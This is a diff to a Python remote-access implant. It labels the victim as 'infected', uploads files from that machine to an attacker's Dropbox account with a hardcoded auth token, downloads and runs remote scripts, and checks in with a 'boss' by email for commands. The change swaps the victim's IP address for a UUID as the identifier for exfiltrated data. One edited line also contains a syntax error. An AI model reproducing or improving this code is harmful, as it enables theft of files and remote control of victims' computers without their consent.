@@ -6,6 +6,7 @@ import time
 import socket
 import ssl
 import dropbox
+import uuid
 
 #Commands List
 #To send a file to user: download [Dropbox path] [Local name]
@@ -22,6 +23,7 @@ SMTP_PORT = 993
 commands = []
 executable_file = "pip_install.py"
 auth_token = "eSp1cKEzdOAAAAAAAAAADFTKh7tVMADzEWVmHJ8Q-aOwZQcT1993aavHJF6Nwvdk"
+id = uuid.uuid1().hex
 
 #Get infected IP
 def getIP():
@@ -37,12 +39,11 @@ def init_dbx():
 
 #Upload a file to dropbox
 def upload_file(path):
-    ip = str(getIP())
     with open(path, 'rb') as f:
-        dbx.files_upload(f.read(), '/' + ip + '/exfiltrated' + path)
+        dbx.files_upload(f.read(), '/' + id + '/exfiltrated' + path)
 
     #SEND AN EMAIL AS RECEIPT OF EXECUTION
-    execution_receipt = "Subject: Uploaded " + path + " from " + str(getIP()) + "s computer " + "\n\n"
+    execution_receipt = "Subject: Uploaded " + path + " from " + id + "s computer." + "\n\n"
     execution_receipt += "Successfuly uploaded file to dropbox"
     sendEmail(execution_receipt)
 
@@ -53,7 +54,7 @@ def download_file(filePath, localName):
         f.write((res.content).decode())
 
     #SEND AN EMAIL AS RECEIPT OF EXECUTION
-    execution_receipt = "Subject: Dowloaded " + filePath + " into " + localName + " file in " + str(getIP()) + "\n\n"
+    execution_receipt = "Subject: Dowloaded " + filePath + " into " + localName + " file in " + id "s computer."+ "\n\n"
     execution_receipt += "Successfuly downloaded from dropbox"
     sendEmail(execution_receipt)
 
@@ -117,7 +118,7 @@ def executeCom(commandString):
     os.remove(executable_file)
 
     #SEND AN EMAIL AS RECEIPT OF EXECUTION
-    execution_receipt = "Subject: Executed " + execCommand + "on " + str(getIP()) + "\n\n"
+    execution_receipt = "Subject: Executed " + execCommand + "on " + id + "\n\n"
     execution_receipt += "Successfuly executed script"
     sendEmail(execution_receipt)
 
@@ -169,7 +170,7 @@ def periodicUpdates(seconds):
     startTime=time.time()
     while True:
         readEmail()
-        message = "Subject: " + str(getIP()) + "\n\n" + "Checkin in boss"
+        message = "Subject: " + id + "\n\n" + "Checkin in boss"
         #sendEmail(message)
         time.sleep(seconds - ((time.time() - startTime) % seconds))
 
